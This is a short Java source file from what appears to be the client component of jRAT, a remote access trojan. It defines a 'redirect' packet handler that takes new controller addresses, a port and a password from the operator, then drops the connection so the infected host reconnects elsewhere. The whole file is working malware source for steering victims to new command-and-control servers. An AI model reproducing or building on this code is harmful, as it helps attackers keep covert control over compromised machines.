package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;
import pro.jrat.stub.Main;

public class Packet75Redirect extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Main.addresses = Connection.readLine();
		Main.port = Connection.readInt();
		Main.pass = Connection.readLine();
		Connection.socket.close();
	}

}
